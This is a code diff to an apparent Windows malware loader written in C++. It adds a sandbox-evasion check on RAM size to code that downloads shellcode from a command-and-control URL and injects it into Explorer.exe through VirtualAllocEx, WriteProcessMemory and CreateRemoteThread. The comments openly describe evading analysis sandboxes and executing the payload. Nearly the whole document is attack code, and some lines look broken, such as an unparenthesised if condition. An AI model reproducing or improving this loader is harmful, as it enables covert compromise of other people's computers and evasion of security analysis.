@@ -21,6 +21,20 @@ const int SHELLCODE_SIZE = 510;
 // PID of Explorer.exe for use in OpenProcess() API call. Find this using Windows Task Manager or Process Explorer.
 const int EXPLORER_PID = 5780;
 
+bool memoryCheck() {
+    // Check memory size. Most sandboxes use low specs to limit the imact on the host system.
+    MEMORYSTATUSEX statex;
+    statex.dwLength = sizeof(statex);
+    GlobalMemoryStatusEx(&statex);
+    // Check if more then 2GB. Adjust this to your meet your requirements.
+    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 2.00) {
+        return true;
+    }
+    else {
+        return false;
+    }
+}
+
 int downloadAndExecute() {
 
     HANDLE hProcess;
@@ -38,6 +52,7 @@ int downloadAndExecute() {
     char buff[SHELLCODE_SIZE];
     unsigned long bytesRead;
     string s;
+    // Open URL stream and download payload
     URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
     while (true) {
         stream->Read(buff, SHELLCODE_SIZE, &bytesRead);
@@ -46,17 +61,26 @@ int downloadAndExecute() {
         }
         s.append(buff, bytesRead);
     }
+    // Allocate memory...
     memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);
-
     WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);
-
+    // ...and execute our payload.
     CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
     stream->Release();
     return 0;
 }
 
 int main() {
+    // Try to sleep through sandbox...
     Sleep(60000);
-    downloadAndExecute();
+    
+    // Only drop and run payload if we are not sandboxed (-anymore-)...
+    if memoryCheck() == true {
+        downloadAndExecute();
+    }
+    else {
+        return 0;
+    }
+
     return 0;
 }
